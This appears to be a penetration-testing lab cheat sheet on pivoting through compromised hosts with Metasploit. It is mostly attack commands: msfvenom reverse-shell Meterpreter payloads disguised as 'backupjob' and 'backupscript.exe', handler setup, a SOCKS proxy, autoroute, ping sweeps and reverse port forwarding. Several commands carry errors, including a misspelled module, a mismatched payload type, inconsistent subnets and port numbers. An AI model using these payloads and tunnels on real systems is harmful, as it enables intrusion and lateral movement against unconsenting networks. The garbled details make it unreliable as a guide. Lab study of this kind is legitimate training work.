Create payload for pivot
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip addr of attackhost> -f elf -o backupjob LPORT=8080
```
Copy over this file by SSH and execute it to gain a Meterpreter session after starting the multi handler
# Starting the Handler
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run
```

# Traffic Tunneling 

1. We got to start a socks proxy server (can skip this step and step 2 if there is already a meterpreter shell from above)
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
```
hide that session (`bg`)and then 


2. add routes for the session
```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

2. or if the meterpreter already exists (this scans that autoroute)
```
meterpreter > run autoroute -s 172.16.5.0/23
```
3. this lists the autoroutes
```
run auotroute -p
```
with socks we can run proxychains commands like above

# Ping Sweep 
Run this twice because it might not work on the first time. Need time to build up its arp cache 
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

alt: 
//linux 
for i in $(seq 1 254); do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done


//windows:
CMD: for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 1000 | find "Reply"

PS: 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

if ping doesn't work because the firewall blocks ICMP, use NMAP

# Reverse Tunneling
reverse port forwarding when we are have meterpreter shell in attack host
```
run autoroute -s 172.16.6.3/16
run autoroute -p
```

```
portfwd add -l 7777 -p 5985 -r 172.16.6.3
```

after that we can just connect using xfreerdp using /v:127.0.0.1:777

the port after -l is the port to connect from our machine
and the port are -p is the port to connect to (like the service u wanna forward)
-r is the ip address of the server u wanna forward

```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```


```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run
```

Payload for our windows hosts -> execute it on windows
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
